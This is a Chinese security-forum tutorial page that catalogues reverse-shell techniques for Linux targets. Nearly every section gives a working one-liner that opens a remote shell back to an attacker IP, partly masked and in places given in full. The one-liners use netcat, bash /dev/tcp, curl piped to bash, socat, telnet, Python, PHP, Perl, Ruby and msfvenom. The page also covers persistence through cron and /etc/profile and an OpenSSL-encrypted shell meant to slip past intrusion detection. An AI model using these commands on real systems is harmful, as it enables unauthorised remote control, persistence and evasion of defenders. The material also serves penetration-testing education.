



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>反弹Shell，看这一篇就够了 - 先知社区</title>
    <meta name="description" content="先知社区，先知安全技术社区">
    <meta name="viewport"
          content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <link rel="icon" href="/static/icon/favicon.ico" type="image/x-icon">
    <link href="/static/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/editor.md/css/editormd.min.css">
    <link rel="stylesheet" href="/static/css/bbs/tango.css">
    <link href="/static/css/bootstrap-responsive.min.css" rel="stylesheet">
    <!-- Le styles -->
    <link rel="stylesheet" href="/static/css/OverlayStyle.css">
    <link rel="stylesheet" href="/static/css/topic.css">
    <link rel="stylesheet" href="/static/css/beautify.css">
    
    <link rel="stylesheet" href="/static/editor.md/css/editormd.css">
    <link rel="stylesheet" href="/static/css/bbs/tango.css">
    <link rel="stylesheet" href="/static/plugins/fancybox/jquery.fancybox.min.css">

    <!--[if lte IE 8]>
        <script src="http://code.jquery.com/jquery-1.11.3.min.js"></script>
    <![endif]-->
    
    

    <!--[if !IE]> -->
    <script type="text/javascript" src="/static/js/jquery-2.1.3.min.js"></script>
    
    
    <script src="/static/plugins/fancybox/jquery.fancybox.min.js"></script>

    <!-- <![endif]-->
</head>
<body>
<!-- navbar begin -->
<div class="navbar navbar-default">
    <div class="navbar-inner">
        <div class="container" style="text-align: center; position:relative;">
            <!--[if lte IE 8]>
            <span style="display:inline-block;margin:0 auto;color:red;">为了更好的体验，请使用IE10及以上版本</span>
            <![endif]-->
            <div class="brand-box">
                <a class="brand" href="/"></a>
            </div>
            
                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F9488&amp;from_type=xianzhi" class="pull-right anonymous-user hh_loding">
                    登录</a>
            
            <div class="nav-collapse collapse">
                <div class="search d1 text-right">
                    <form method="get" action="/search">
                        <input type="text" placeholder="搜索" name="keyword"  >
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
<!-- navbar end -->
<!-- main content begin -->
<div id="Wrapper" class="container">
    
    
    <div class="row2">
        <div class="span10">
            
    



    <script src="/static/plugins/toc/jquery.toc.min.js"></script>
    <script src="/static/plugins/toc/toc.min.js"></script>
    <script src="/static/js/dt.js"></script>
    


<div class="row box content">
    
    <div class="box-container">
        <div class="main-topic">
            <div class="clearfix user-info topic-list">
                <p><span
                        class="content-title ">反弹Shell，看这一篇就够了</span>
                </p>
                <div class="topic-info">
                <span class="info-left">
                    <a href="/u/31688">
                        <span class="username cell"> WHOAMIBunny</span></a> <span
                        class="i-seprator"> / </span>
                    <span> 2021-04-30 16:32:26</span><span
                        class="i-seprator"> / </span>
                    <span>浏览数 6577</span>
                    
                    
                    <span class="content-node">
                    
                        <span class="label label-default label-node-first">
                            <a href="/tab/1">安全技术</a></span>
                        <span class="label label-default">
                            <a href="/node/16">WEB安全</a></span>
                    
                    </span>
                </span>
                    <span class="pull-right t-vote cell info-right"><a class="vote vote-up" href="javascript:" onclick="voteUp(9488);">
             顶(0)</a>
             <a class="vote vote-down" href="javascript:" onclick="voteDown(9488);">
             踩(0)</a></span>
                </div>
            </div>
            <hr>
            <div id="topic_content" class="topic-content markdown-body">
                <p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210423205828-98f41368-a433-1.jpg"></p>
<h2>前言</h2>
<p>在渗透测试实战中，我们经常会遇到Linux系统环境，而让Linux主机反弹个shell是再常见不过的事情了。</p>
<p>反弹shell，就是攻击机监听在某个TCP/UDP端口为服务端，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。</p>
<h3>正向连接</h3>
<p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。</p>
<h3>反向连接</h3>
<p>那么为什么要用反弹shell呢？</p>
<p>反弹shell通常适用于如下几种情况：</p>
<ul>
<li>目标机因防火墙受限，目标机器只能发送请求，不能接收请求。</li>
<li>目标机端口被占用。</li>
<li>目标机位于局域网，或IP会动态变化，攻击机无法直接连接。</li>
<li>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的。</li>
<li>......</li>
</ul>
<p>对于以上几种情况，我们是无法利用正向连接的，要用反向连接。</p>
<p>那么反向连接就很好理解了，就是攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，即为反向连接。</p>
<p>反弹shell的方式有很多，那具体要用哪种方式还需要根据目标主机的环境来确定，比如目标主机上如果安装有netcat，那我们就可以利用netcat反弹shell，如果具有python环境，那我们可以利用python反弹shell。如果具有php环境，那我们可以利用php反弹shell。</p>
<h2>利用netcat反弹shell</h2>
<p>Netcat 是一款简单的Unix工具，使用UDP和TCP协议。 它是一个可靠的容易被其他程序所启用的后台操作工具，同时它也被用作网络的测试工具或黑客工具。 使用它你可以轻易的建立任何连接。</p>
<p>目前，默认的各个linux发行版本已经自带了netcat工具包，但是可能由于处于安全考虑原生版本的netcat带有可以直接发布与反弹本地shell的功能参数 -e 都被阉割了，所以我们需要自己手动下载二进制安装包，安装的如下：</p>
<div class="highlight"><pre><span></span><span class="n">wget</span> <span class="ss">https</span><span class="p">:</span><span class="sr">//n</span><span class="n">chc</span><span class="o">.</span><span class="n">dl</span><span class="o">.</span><span class="n">sourceforge</span><span class="o">.</span><span class="n">net</span><span class="o">/</span><span class="n">project</span><span class="o">/</span><span class="n">netcat</span><span class="o">/</span><span class="n">netcat</span><span class="o">/</span><span class="mi">0</span><span class="o">.</span><span class="mi">7</span><span class="o">.</span><span class="mi">1</span><span class="o">/</span><span class="n">netcat</span><span class="o">-</span><span class="mi">0</span><span class="o">.</span><span class="mi">7</span><span class="o">.</span><span class="mi">1</span><span class="o">.</span><span class="n">tar</span><span class="o">.</span><span class="n">gz</span>
<span class="n">tar</span> <span class="o">-</span><span class="n">xvzf</span> <span class="n">netcat</span><span class="o">-</span><span class="mi">0</span><span class="o">.</span><span class="mi">7</span><span class="o">.</span><span class="mi">1</span><span class="o">.</span><span class="n">tar</span><span class="o">.</span><span class="n">gz</span>
<span class="o">.</span><span class="n n-Operator">/</span><span class="n">configure</span>
<span class="n">make</span> <span class="o">&amp;&amp;</span> <span class="n">make</span> <span class="n">install</span>
<span class="n">make</span> <span class="n">clean</span>
</pre></div>
<p>安装完原生版本的 netcat 工具后，便有了netcat -e参数，我们就可以将本地bash反弹到攻击机上了。</p>
<p><strong>攻击机开启本地监听：</strong></p>
<div class="highlight"><pre><span></span><span class="n">netcat</span> <span class="o">-</span><span class="n">lvvp</span> <span class="mi">2333</span>
</pre></div>
<p><strong>目标机主动连接攻击机：</strong></p>
<div class="highlight"><pre><span></span><span class="n">netcat</span> <span class="mi">47</span><span class="o">.</span><span class="n">xxx</span><span class="o">.</span><span class="n">xxx</span><span class="o">.</span><span class="mi">72</span> <span class="mi">2333</span> <span class="o">-</span><span class="n">e</span> <span class="sr">/bin/</span><span class="n">bash</span>
<span class="c1"># nc &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e /bin/bash</span>
</pre></div>
<p>执行效果如下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210423205828-9929e0ec-a433-1.png"></p>
<h2>利用Bash反弹shell</h2>
<p>个人感觉反弹shell最好用的方法就是使用bash结合重定向方法的一句话，具体命令如下：</p>
<div class="highlight"><pre><span></span>bash -i &gt;<span class="p">&amp;</span> /dev/tcp/47.xxx.xxx.72/2333 <span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
或
bash -c <span class="s2">"bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1"</span>
<span class="c1"># bash -i &gt;&amp; /dev/tcp/攻击机IP/攻击机端口 0&gt;&amp;1</span>
</pre></div>
<blockquote><p>以下是针对Bash反弹一句话进行了拆分说明：</p>
<table>
<thead><tr>
<th style="">命令</th>
<th style="">命令详解</th>
</tr>
</thead>
<tbody>
<tr>
<td style="">bash -i</td>
<td style="">产生一个bash交互环境。</td>
</tr>
<tr>
<td style="">&gt;&amp;</td>
<td style="">将联合符号前面的内容与后面相结合，然后一起重定向给后者。</td>
</tr>
<tr>
<td style="">/dev/tcp/47.xxx.xxx.72/2333</td>
<td style="">Linux环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。</td>
</tr>
<tr>
<td style="">0&gt;&amp;1</td>
<td style="">将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。</td>
</tr>
</tbody>
</table>
<p>Bash反弹一句完整的解读过程就是：</p>
<p>Bash产生了一个交互环境和本地主机主动发起与攻击机2333端口建立的连接（即TCP 2333会话连接）相结合，然后在重定向个TCP 2333会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个Bash反弹环境。</p>
</blockquote>
<p><strong>攻击机开启本地监听：</strong></p>
<div class="highlight"><pre><span></span><span class="n">nc</span> <span class="o">-</span><span class="n">lvvp</span> <span class="mi">2333</span>
</pre></div>
<p><strong>目标机主动连接攻击机：</strong></p>
<div class="highlight"><pre><span></span><span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&gt;&amp;</span> <span class="sr">/dev/</span><span class="n">tcp</span><span class="o">/</span><span class="mi">47</span><span class="o">.</span><span class="n">xxx</span><span class="o">.</span><span class="n">xxx</span><span class="o">.</span><span class="mi">72</span><span class="o">/</span><span class="mi">2333</span> <span class="mi">0</span><span class="o">&gt;&amp;</span><span class="mi">1</span>
</pre></div>
<p>执行效果如下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210423205828-995bd912-a433-1.png"></p>
<h3>Curl配合Bash反弹shell</h3>
<p>这里操作也很简单，借助了Linux中的管道。</p>
<p>首先，在攻击者vps的web目录里面创建一个index文件（index.php或index.html），内容如下：</p>
<div class="highlight"><pre><span></span>bash -i &gt;<span class="p">&amp;</span> /dev/tcp/47.xxx.xxx.72/2333 <span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
</pre></div>
<p>并开启2333端口的监听。</p>
<p>然后再目标机上执行如下，即可反弹shell：</p>
<div class="highlight"><pre><span></span>curl <span class="m">47</span>.xxx.xxx.72<span class="p">|</span>bash
</pre></div>
<p>执行效果如下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210423205829-99925956-a433-1.png"></p>
<p>根据curl命令和Linux管道的作用，你不难理解这其中的原理。</p>
<p>Curl配合Bash反弹shell的方式在CTF题目中经常出现，<code>curl IP|bash</code> 中的IP可以是任意格式的，可以是十进制、十六进制、八进制、二进制等等。</p>
<h3>将反弹shell的命令写入定时任务</h3>
<p>我们可以在目标主机的定时任务文件中写入一个反弹shell的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹shell命令是要写在 <code>/var/spool/cron/[crontabs]/&lt;username&gt;</code> 内的，所以必须要知道远程主机当前的用户名。否则就不能生效。</p>
<p>比如，当前用户名为root，我们就要将下面内容写入到 /var/spool/cron/root 中。(centos系列主机)</p>
<p>比如，当前用户名为root，我们就要将下面内容写入到 /var/spool/cron/crontabs/root 中。(Debian/Ubuntu系列主机)</p>
<div class="highlight"><pre><span></span><span class="o">*/</span><span class="mi">1</span>  <span class="o">*</span>  <span class="o">*</span>  <span class="o">*</span>  <span class="o">*</span>   <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span> <span class="o">-</span><span class="n">i</span><span class="o">&gt;&amp;/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="mf">47.</span><span class="n">xxx</span><span class="o">.</span><span class="n">xxx</span><span class="o">.</span><span class="mi">72</span><span class="o">/</span><span class="mi">2333</span> <span class="mi">0</span><span class="o">&gt;&amp;</span><span class="mi">1</span>

<span class="c1">#每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell</span>
</pre></div>
<h3>将反弹shell的命令写入/etc/profile文件</h3>
<p>将以下反弹shell的命写入/etc/profile文件中，/etc/profile中的内容会在用户打开bash窗口时执行。</p>
<div class="highlight"><pre><span></span><span class="sr">/bin/</span><span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&gt;&amp;</span> <span class="sr">/dev/</span><span class="n">tcp</span><span class="o">/</span><span class="mi">47</span><span class="o">.</span><span class="n">xxx</span><span class="o">.</span><span class="n">xxx</span><span class="o">.</span><span class="mi">72</span><span class="o">/</span><span class="mi">2333</span> <span class="mi">0</span><span class="o">&gt;&amp;</span><span class="mi">1</span> <span class="o">&amp;</span>
<span class="c1"># 最后面那个&amp;为的是防止管理员无法输入命令</span>
</pre></div>
<p><img></p>
<p>当目标主机管理员远程连接该主机时，就会执行该命令，成功获得目标机的shell：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210423205829-99d50ed6-a433-1.png"></p>
<h2>利用Socat反弹shell</h2>
<p>Socat是Linux 下一个多功能的网络工具，名字来由是”Socket CAT”，因此可以看出它是基于socket的，其功能与netcat类似，不过据说可以看做netcat的加强版，事实上的确也是如此。我这里只简单的介绍下怎么使用它开启监听和反弹shell，其他详细内容可以参见这里：<a href="http://brieflyx.me/2015/linux-tools/socat-introduction/" target="_blank">http://brieflyx.me/2015/linux-tools/socat-introduction/</a></p>
<p>安装Socat的方法很简单：</p>
<ul>
<li>Ubuntu等可以直接使用 <code>apt-get install socat</code> 命令进行安装</li>
<li>也可以去官网下载源码包：<a href="http://www.dest-unreach.org/socat" target="_blank">http://www.dest-unreach.org/socat</a></li>
</ul>
<p><strong>攻击机开启本地监听：</strong></p>
<div class="highlight"><pre><span></span><span class="n">socat</span> <span class="no">TCP</span><span class="o">-</span><span class="ss">LISTEN</span><span class="p">:</span><span class="mi">2333</span> <span class="o">-</span>
<span class="err">或</span>
<span class="n">nc</span> <span class="o">-</span><span class="n">lvvp</span> <span class="mi">2333</span>
</pre></div>
<p><strong>目标机主动连接攻击机：</strong></p>
<div class="highlight"><pre><span></span><span class="n">socat</span> <span class="n">tcp</span><span class="o">-</span><span class="ss">connect</span><span class="p">:</span><span class="mi">47</span><span class="o">.</span><span class="n">xxx</span><span class="o">.</span><span class="n">xxx</span><span class="o">.</span><span class="mi">72</span><span class="p">:</span><span class="mi">2333</span> <span class="nb">exec</span><span class="ss">:'bash -li'</span><span class="p">,</span><span class="n">pty</span><span class="p">,</span><span class="n">stderr</span><span class="p">,</span><span class="n">setsid</span><span class="p">,</span><span class="n">sigint</span><span class="p">,</span><span class="n">sane</span>
</pre></div>
<p>执行效果如下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210423205829-9a0139ac-a433-1.png"></p>
<h2>利用Telnet反弹shell</h2>
<p>当nc和/dev/tcp不可用，且目标主机和攻击机上支持Telnet服务时，我们可以使用Telnet反弹shell。</p>
<h3>方法一</h3>
<p><strong>攻击机开启本地监听：</strong></p>
<div class="highlight"><pre><span></span><span class="n">nc</span> <span class="o">-</span><span class="n">lvvp</span> <span class="mi">2333</span>
</pre></div>
<p><strong>目标机主动连接攻击机：</strong></p>
<div class="highlight"><pre><span></span><span class="n">mknod</span> <span class="n">a</span> <span class="nb">p</span><span class="p">;</span> <span class="n">telnet</span> <span class="mi">47</span><span class="o">.</span><span class="n">xxx</span><span class="o">.</span><span class="n">xxx</span><span class="o">.</span><span class="mi">72</span> <span class="mi">2333</span> <span class="mi">0</span><span class="o">&lt;</span><span class="n">a</span> <span class="o">|</span> <span class="sr">/bin/</span><span class="n">bash</span> <span class="mi">1</span><span class="o">&gt;</span><span class="n">a</span>
</pre></div>
<p>执行效果如下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210423205830-9a3a5fca-a433-1.png"></p>
<h3>方法二</h3>
<p><strong>攻击机需要开启两个本地监听：</strong></p>
<div class="highlight"><pre><span></span><span class="n">nc</span> <span class="o">-</span><span class="n">lvvp</span> <span class="mi">2333</span>
<span class="n">nc</span> <span class="o">-</span><span class="n">lvvp</span> <span class="mi">4000</span>
</pre></div>
<p><strong>目标机主动连接攻击机：</strong></p>
<div class="highlight"><pre><span></span><span class="n">telnet</span> <span class="mi">47</span><span class="o">.</span><span class="mi">101</span><span class="o">.</span><span class="mi">57</span><span class="o">.</span><span class="mi">72</span> <span class="mi">2333</span> <span class="o">|</span> <span class="sr">/bin/</span><span class="n">bash</span> <span class="o">|</span> <span class="n">telnet</span> <span class="mi">47</span><span class="o">.</span><span class="mi">101</span><span class="o">.</span><span class="mi">57</span><span class="o">.</span><span class="mi">72</span> <span class="mi">4000</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210423205830-9a79626a-a433-1.png"></p>
<p>如上图所示，获得shell后，在攻击机2333端口的终端上输入的命令会在目标机上执行，执行的回显将通过4000端口的终端显示出来。</p>
<h2>各种脚本反弹shell</h2>
<h3>Python 脚本反弹shell</h3>
<p>当目标主机上有python环境时，我们可以用Python来反弹shell。Python在现在一般发行版Linux系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。</p>
<p><strong>攻击机开启本地监听：</strong></p>
<div class="highlight"><pre><span></span><span class="n">nc</span> <span class="o">-</span><span class="n">lvvp</span> <span class="mi">2333</span>
</pre></div>
<p><strong>目标机主动连接攻击机：</strong></p>
<div class="highlight"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("47.xxx.xxx.72",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
</pre></div>
<p>执行效果如下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210423205830-9aa69d70-a433-1.png"></p>
<h3>php 脚本反弹shell</h3>
<p>当目标主机上有php环境时，我们可以用php来反弹shell。</p>
<p><strong>攻击机开启本地监听：</strong></p>
<div class="highlight"><pre><span></span><span class="n">nc</span> <span class="o">-</span><span class="n">lvvp</span> <span class="mi">2333</span>
</pre></div>
<p><strong>目标机主动连接攻击机：</strong></p>
<div class="highlight"><pre><span></span><span class="x">php -r '$sock=fsockopen("47.xxx.xxx.72",2333);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
</pre></div>
<h3>Perl 脚本反弹shell</h3>
<p>当目标主机上有perl环境时，我们可以用perl来反弹shell。</p>
<p><strong>攻击机开启本地监听：</strong></p>
<div class="highlight"><pre><span></span><span class="n">nc</span> <span class="o">-</span><span class="n">lvvp</span> <span class="mi">2333</span>
</pre></div>
<p><strong>目标机主动连接攻击机：</strong></p>
<div class="highlight"><pre><span></span><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="s">'use Socket;$i="47.101.57.72";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</span>
</pre></div>
<p>执行效果如下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210423205831-9ad24a92-a433-1.png"></p>
<h3>Ruby脚本反弹shell</h3>
<p>当目标主机上有ruby环境时，我们可以用ruby来反弹shell。</p>
<p><strong>攻击机开启本地监听：</strong></p>
<div class="highlight"><pre><span></span><span class="n">nc</span> <span class="o">-</span><span class="n">lvvp</span> <span class="mi">2333</span>
</pre></div>
<p><strong>目标机主动连接攻击机：</strong></p>
<div class="highlight"><pre><span></span><span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span> <span class="s1">'c=TCPSocket.new("47.xxx.xxx.72","2333");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</span>
<span class="err">或</span>
<span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span> <span class="s1">'exit if fork;c=TCPSocket.new("47.xxx.xxx.72","2333");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</span>
</pre></div>
<p>执行效果如下：</p>
<p><img src=""></p>
<h2>使用Metasploit生成反弹shell用的一句话</h2>
<p>强大的Metasploit框架也为我们提供了生成一句话反弹shell的工具，即msfvenom，绝对的实用。当我们不记得前面说的所有反弹shell的反弹语句时，只要我们有Metasploit，那么我们随时都可以使用 <code>msfvenom -l</code> 来查询生成我们所需要的各类命令行一句话，具体使用方法如下。</p>
<p>我们直接可以使用 <code>msfvenom -l</code> 结合关键字过滤（如cmd/unix/reverse），列出我们需要生成的各类反弹shell一句话的payload：</p>
<div class="highlight"><pre><span></span><span class="n">msfvenom</span> <span class="o">-</span><span class="n">l</span> <span class="n">payloads</span> <span class="o">|</span> <span class="n">grep</span> <span class="s1">'cmd/unix/reverse'</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210423205832-9b97969e-a433-1.png"></p>
<p>如上图所示，metasploit支持生成反弹shell一句话的类型非常丰富，大家可以依据渗透测试对象自行选择使用。比如，我们获取一个python反弹shell的一句话：</p>
<div class="highlight"><pre><span></span><span class="n">msfvenom</span> <span class="o">-</span><span class="nb">p</span> <span class="n">cmd</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">reverse_python</span> <span class="no">LHOST</span><span class="o">=</span><span class="mi">47</span><span class="o">.</span><span class="n">xxx</span><span class="o">.</span><span class="n">xxx</span><span class="o">.</span><span class="mi">72</span> <span class="no">LPORT</span><span class="o">=</span><span class="mi">2333</span> <span class="o">-</span><span class="n">f</span> <span class="n">raw</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210423205833-9bee1b22-a433-1.png"></p>
<p>将生成的python反弹shell的一句话在目标主机上执行即可：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210423205833-9c6594b8-a433-1.png"></p>
<h2>反弹shell后获取模拟终端</h2>
<p>其实，上面所讲的各种方法获取的shell都不是一个标准的虚拟终端环境，它仅仅是一个标准输入。你会发现存在一个问题，就是即使我们获取了目标虚拟终端控制权限，但是往往会发现其交互性非常的差，回显信息与可交互性非常的差和不稳定，具体见情况有以下几个种。</p>
<ul>
<li>获取的虚拟终端没有交互性，我们想给添加的账号设置密码或执行sudo等命令，无法完成。 </li>
<li>标准的错误输出无法显示，无法正常使用vim等文本编辑器等。</li>
<li>获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。</li>
</ul>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210423205834-9c783b0e-a433-1.png"></p>
<p>这往往都是因为我们获取的shell并不是标准的虚拟终端，为了能够完成输入密码等操作，我们必须模拟一个真正的终端设备。</p>
<p>我们其实可以借助于python默认包含的一个pty标准库来获取一个标准的虚拟终端环境。Python在现在一般发行版Linux系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。</p>
<p>我们只需在获取的shell里面输入如下命令，即可模拟一个终端设备：</p>
<div class="highlight"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s2">"import pty;pty.spawn('/bin/bash')"</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210423205834-9c900e1e-a433-1.png"></p>
<p>如上图所示，成功模拟在shell中出了一个终端设备，并成功执行了sudo等命令。</p>
<h2>使用OpenSSL反弹加密shell</h2>
<p>在上文中，我们总结了很多反弹shell得方法，但是我发现这种反弹 shell 方式都有一个缺点，那就是<strong>所有的流量都是明文传输的</strong>。这些通过shell通过传输的流量都可以被管理员直接抓取并理解，当目标主机网络环境存在网络防御检测系统时（IDS、IPS等），网络防御检测系统会获取到我们的通信内容并进行告警和阻止。因此，我们需要对通信的内容进行混淆或加密，这时可以选择使用 OpenSSL 反弹一个加密的 shell。</p>
<h3>OpenSSL 简介</h3>
<p>在计算机网络上，OpenSSL 是一个开放源代码的软件库包，应用程序可以使用这个包来进行安全通信，避免窃听，同时确认另一端连接者的身份。</p>
<blockquote><p>SSL协议要求建立在可靠的传输层协议(TCP)之上。SSL协议的优势在于它是与应用层协议独立无关的，高层的应用层协议(例如：HTTP，FTP，TELNET等)能透明地建立于SSL协议之上。SSL协议在应用层协议通信之前就已经完成加密算法、通信密钥的协商及服务器认证工作。在此之后应用层协议所传送的数据都会被加密，从而保证通信的私密性。</p>
</blockquote>
<p>在利用 OpenSSL 反弹 shell 之前需要先生成自签名证书：</p>
<div class="highlight"><pre><span></span><span class="n">openssl</span> <span class="n">req</span> <span class="o">-</span><span class="n">x509</span> <span class="o">-</span><span class="n">newkey</span> <span class="ss">rsa</span><span class="p">:</span><span class="mi">2048</span> <span class="o">-</span><span class="n">keyout</span> <span class="n">key</span><span class="o">.</span><span class="n">pem</span> <span class="o">-</span><span class="n">out</span> <span class="n">cert</span><span class="o">.</span><span class="n">pem</span> <span class="o">-</span><span class="n">days</span> <span class="mi">365</span> <span class="o">-</span><span class="n">nodes</span>
</pre></div>
<p>生成自签名证书时会提示输入证书信息，如果懒得填写可以一路回车即可：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210423205834-9cc28f06-a433-1.png"></p>
<h3>使用OpenSSL反弹加密shell</h3>
<p>实验环境：Linux</p>
<p>目标机：</p>
<ul>
<li>系统：Linux</li>
<li>IP：192.168.1.8</li>
</ul>
<p>攻击机：</p>
<ul>
<li>系统：Linux</li>
<li>IP：47.xxx.xxx.72</li>
</ul>
<p>假设我们从目标机反弹 shell 到攻击机 。首先需要利用上一步生成的自签名证书，在攻击机上使用 OpenSSL 监听一个端口，在这里使用 2333 端口：</p>
<div class="highlight"><pre><span></span><span class="n">openssl</span> <span class="n">s_server</span> <span class="o">-</span><span class="n">quiet</span> <span class="o">-</span><span class="n">key</span> <span class="n">key</span><span class="o">.</span><span class="n">pem</span> <span class="o">-</span><span class="n">cert</span> <span class="n">cert</span><span class="o">.</span><span class="n">pem</span> <span class="o">-</span><span class="n">port</span> <span class="mi">2333</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210423205834-9cd6cdc2-a433-1.png"></p>
<p>此时 OpenSSL 便在攻击机的 2333 端口上启动了一个 SSL/TLS server。</p>
<p>这时在目标机进行反弹 shell 操作，命令为：</p>
<div class="highlight"><pre><span></span><span class="n">mkfifo</span> <span class="sr">/tmp/s</span><span class="p">;</span> <span class="sr">/bin/s</span><span class="n">h</span> <span class="o">-</span><span class="n">i</span> <span class="o">&lt;</span> <span class="sr">/tmp/s</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span> <span class="o">|</span> <span class="n">openssl</span> <span class="n">s_client</span> <span class="o">-</span><span class="n">quiet</span> <span class="o">-</span><span class="n">connect</span> <span class="mi">47</span><span class="o">.</span><span class="n">xxx</span><span class="o">.</span><span class="n">xxx</span><span class="o">.</span><span class="mi">72</span><span class="p">:</span><span class="mi">2333</span> <span class="o">&gt;</span> <span class="sr">/tmp/s</span><span class="p">;</span> <span class="n">rm</span> <span class="sr">/tmp/s</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210423205835-9d206d6a-a433-1.png"></p>
<p>这样攻击者便使用 OpenSSL 反弹了目标机一个加密的 shell。</p>
<h2>Ending......</h2>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210423205838-9f4cebf4-a433-1.jpg"></p>
<blockquote><p>参考：</p>
<p><a href="https://www.cnblogs.com/threesoil/p/10958126.html" target="_blank">https://www.cnblogs.com/threesoil/p/10958126.html</a></p>
<p><a href="https://www.anquanke.com/post/id/87017" target="_blank">https://www.anquanke.com/post/id/87017</a></p>
<p><a href="https://blog.csdn.net/qq_36119192/article/details/84641379" target="_blank">https://blog.csdn.net/qq_36119192/article/details/84641379</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&amp;mid=2247499270&amp;idx=3&amp;sn=53e64aa3bb989992bb76773b35a83b71&amp;chksm=f9e3915dce94184b46b41c1cce5334a0b18f72773b5e5a918316e77717f5f04ca8a083ee1175&amp;mpshare=1&amp;scene=23&amp;srcid=1218GWYAerBiIEpRSlSvuUoD&amp;sharer_sharetime=1608272916742&amp;sharer_shareid=fb28a23f5efa30b40dcc9905f48f84bf#rd" target="_blank">https://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&amp;mid=2247499270&amp;idx=3&amp;sn=53e64aa3bb989992bb76773b35a83b71&amp;chksm=</a></p>
</blockquote>

            </div>
            

            <div class="post-user-action" style="margin-top: 34px;">
                <span class="btn btn-default pull-right" id="mark" data-action="topic"
                      data-pk="9488">
                    <span id="mark-text">点击收藏 </span><span
                        class="i-seprator"> | </span><span id="mark-count">2</span>
                </span>
                
                    <span class="btn btn-default pull-right" id="follow_topic" data-pk="9488">
                     <span>关注</span><span class="i-seprator"> | </span><span
                            id="follow-count">1</span>
                    </span>
                
                <div class="clearfix"></div>
            </div>
            
                <div class="related-section">
                    <div class="related-box">
                        
                            <span><a class="pull-left" href="/t/9487"
                                     title="记一次授权渗透测试"><span class="related-label"
                                                                   style="padding: 3px 4px;margin-right: 3px;">上一篇：</span>记一次授权渗透测试</a></span>
                        
                        
                            <span><a class="pull-left" href="/t/9481"
                                     title="粗略快速定位程序中明显的漏洞（.Net审计）"><span class="related-label"
                                                                    style="">下一篇：</span>粗略快速定位程序中明显的漏洞（.N...</a></span>
                        
                    </div>
                </div>
